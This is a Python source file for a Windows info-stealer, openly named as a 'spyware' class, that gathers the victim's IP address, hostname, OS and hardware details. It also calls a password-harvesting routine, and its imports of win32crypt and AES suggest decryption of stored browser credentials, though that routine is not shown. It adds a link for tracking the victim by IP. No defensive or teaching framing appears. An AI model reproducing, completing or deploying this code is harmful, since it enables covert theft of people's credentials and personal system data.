import os
import json
import base64
import shutil
import psutil
import socket
import sqlite3
import platform
import win32crypt
from Cryptodome.Cipher import AES

class spyware:
    ip = ""
    current_user = ""

    def __init__(self):
        self.ip = ""
        self.current_user = ""

    def get_system_info(self):
        final_str = "\nSystem Information:\n"
        
        data_dictionary = {"IP-Address" : "", "Hostname" : "", "Platform:" : "", "Release-Data" : "", "Version" : "", "Processor" : "", "Architecture" : "", "Ram" : ""}
        data_dictionary["Platform:"] = platform.system()
        data_dictionary["Release-Data"] = platform.release()
        data_dictionary["Version"] = platform.version()
        data_dictionary["Architecture"] = platform.machine()
        data_dictionary["Hostname"] = socket.gethostname()
        data_dictionary["IP-Address"] = socket.gethostbyname(socket.gethostname())
        data_dictionary["Processor"] = platform.processor()
        data_dictionary["Ram"] = str(round(psutil.virtual_memory().total / (1024.0 **3))) +" GB"
        
        self.ip = data_dictionary["IP-Address"]
        for key, value in data_dictionary.items():
            final_str += "{}: {}\n".format(key, value)            

        return final_str

    def get_info(self):
        system_info = "For tracking the user by ip, go to: {}.\n".format("https://www.opentracker.net/feature/ip-tracker/")
        try:
            system_info += self.get_system_info()
            system_info += self.get_passwords()

            return system_info
        except Exception:
            pass
